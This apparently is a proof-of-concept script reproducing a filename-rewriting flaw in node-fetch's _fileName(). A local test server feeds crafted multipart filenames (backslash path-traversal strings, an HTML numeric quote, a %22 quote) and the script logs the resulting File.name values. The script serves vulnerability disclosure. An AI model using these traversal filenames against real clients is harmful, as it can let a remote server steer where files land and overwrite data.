// PoC: node-fetch's _fileName() rewrites the server-controlled Content-Disposition filename.
// Run: npm install && node repro.mjs   (Node 18+)
//
// Per RFC 7578 / RFC 2616 the filename is a quoted-string or token. On top of that,
// node-fetch's _fileName() (1) truncates at the last backslash, (2) decodes 4-digit HTML
// numeric references (&#NNNN;) and (3) decodes %22 -- so a remote server can steer File.name.
import http from 'node:http';
import fetch from 'node-fetch';

async function run(filenamePart, label) {
  const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'multipart/form-data; boundary=XB' });
    res.end(
      '--XB\r\n' +
      'Content-Disposition: form-data; name=f; filename="' + filenamePart + '"\r\n' +
      '\r\nhello\r\n--XB--\r\n'
    );
  });
  await new Promise(r => server.listen(0, r));
  const port = server.address().port;
  const fd = await (await fetch('http://127.0.0.1:' + port)).formData();
  const f = fd.get('f');
  console.log(label.padEnd(28), 'wire =', JSON.stringify(filenamePart),
              '=> File.name =', JSON.stringify(f && f.name));
  server.close();
}

await run('a\\\\..\\\\..\\\\pwned', 'backslash ../ escape');
await run('x.txt\\\\..\\\\evil.txt', 'backslash + ../ path');
await run('a&#0034;b', 'html-numeric &#0034; (")');
await run('a%22b', 'pct-encoded %22 (")');
await run('plain.txt', 'control');
